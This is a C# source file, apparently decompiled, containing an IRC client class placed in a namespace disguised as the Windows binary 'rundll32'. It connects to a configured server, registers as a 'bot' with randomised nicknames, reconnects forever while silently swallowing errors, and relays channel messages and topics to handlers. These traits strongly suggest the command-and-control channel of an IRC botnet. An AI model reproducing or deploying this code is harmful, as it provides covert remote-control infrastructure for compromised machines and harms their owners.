using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace rundll32;

public class irc
{
	public delegate void onConnectionDelegate(irc irc);

	public delegate void onMessageReceivedDelegate(irc irc, ircMessage message);

	private Thread thisThread;

	private TcpClient tcpClient;

	private StreamWriter streamWriter;

	private StreamReader streamReader;

	private string _nick;

	private string _user;

	private ircConnectionDetails _connectionDetails;

	public string nick
	{
		get
		{
			return _nick;
		}
		set
		{
			_nick = value;
			sendNick(value);
		}
	}

	public string user => _user;

	public ircConnectionDetails connectionDetails => _connectionDetails;

	public event onConnectionDelegate onConnection;

	public event onMessageReceivedDelegate onMessageReceived;

	public irc(ircConnectionDetails connectionDetails, ircUser userDetails)
	{
		_connectionDetails = connectionDetails;
		_nick = userDetails.nick;
		_user = userDetails.user;
	}

	public void Stop()
	{
		try
		{
			tcpClient.Close();
		}
		catch
		{
		}
		try
		{
			thisThread.Abort();
		}
		catch
		{
		}
	}

	public void connect()
	{
		Stop();
		thisThread = new Thread(connectThreadLoop);
		thisThread.Start();
	}

	private void connectThreadLoop()
	{
		while (true)
		{
			try
			{
				while (true)
				{
					tcpClient = new TcpClient();
					tcpClient.Connect(connectionDetails.host, connectionDetails.port);
					streamReader = new StreamReader(tcpClient.GetStream());
					streamWriter = new StreamWriter(tcpClient.GetStream());
					streamWriter.AutoFlush = true;
					if (config.pass != null)
					{
						sendPass(config.pass);
					}
					sendUser(user);
					sendNick(nick);
					startHandling();
				}
			}
			catch
			{
			}
		}
	}

	private void startHandling()
	{
		try
		{
			while (true)
			{
				if (!tcpClient.Connected)
				{
					return;
				}
				string text = streamReader.ReadLine();
				Console.WriteLine("in: " + text);
				if (text == null)
				{
					break;
				}
				try
				{
					string[] array = text.Split(new char[1] { ' ' });
					if (array[0] == "PING")
					{
						sendPong(array[1].Substring(1));
						continue;
					}
					switch (array[1].ToUpper())
					{
					case "332":
					{
						string text6 = text.Substring(1);
						text6 = text6.Substring(text6.IndexOf(":") + 1);
						ircUser ircUser4 = new ircUser(null, "127.0.0.1", "Topic", "Topic");
						ircMessage message3 = new ircMessage(ircUser4, text6, array[3]);
						this.onMessageReceived(this, message3);
						break;
					}
					case "433":
					{
						string newValue = new Random().Next(10000, 99999).ToString();
						_nick = config.nick.Replace("%rand%", newValue);
						_user = config.user.Replace("%rand%", newValue);
						tcpClient.Close();
						break;
					}
					case "999":
						this.onConnection(this);
						break;
					case "001":
						this.onConnection(this);
						break;
					case "TOPIC":
					{
						string text5 = text.Substring(1);
						text5 = text5.Substring(text5.IndexOf(":") + 1);
						ircUser ircUser3 = new ircUser(null, "127.0.0.1", "Topic", "Topic");
						ircMessage message2 = new ircMessage(ircUser3, text5, array[2]);
						this.onMessageReceived(this, message2);
						break;
					}
					case "PRIVMSG":
					{
						string text2 = array[0].Substring(0, array[0].IndexOf("!")).Substring(1);
						string text3 = array[0].Substring(array[0].IndexOf("!") + 1, array[0].IndexOf("@") - (array[0].IndexOf("!") + 1));
						string host = array[0].Substring(array[0].IndexOf("@") + 1);
						string channel = array[2];
						string text4 = text.Substring(1);
						text4 = text4.Substring(text4.IndexOf(":") + 1);
						ircUser ircUser2 = new ircUser(this, text2, text3, host);
						ircMessage message = new ircMessage(ircUser2, text4, channel);
						this.onMessageReceived(this, message);
						break;
					}
					}
				}
				catch
				{
				}
			}
			throw new Exception("Reconnect");
		}
		catch
		{
			Thread.Sleep(5000);
			connect();
		}
	}

	public void send(string data)
	{
		try
		{
			Console.WriteLine("out: " + data);
			streamWriter.WriteLine(data);
		}
		catch
		{
		}
	}

	private void sendPass(string pass)
	{
		send("PASS " + pass);
	}

	public void sendUser(string user)
	{
		send("USER bot 0 * : " + user);
	}

	public void sendNick(string nick)
	{
		send("NICK " + nick);
	}

	public void sendJoin(string channel)
	{
		send("JOIN " + channel);
	}

	public void sendJoin(string channel, string key)
	{
		send("JOIN " + channel + " " + key);
	}

	public void sendPart(string channel)
	{
		send("PART " + channel);
	}

	public void sendPong(string data)
	{
		send("PONG " + data);
	}

	public void sendMessage(string channel, string message)
	{
		send("PRIVMSG " + channel + " :\u000314" + message);
	}

	public void sendNotice(string user, string message)
	{
		send("NOTICE " + user + " :\u000314" + message);
	}

	public void sendQuit()
	{
		send("QUIT");
	}

	public void sendQuit(string reason)
	{
		send("QUIT " + reason);
	}
}
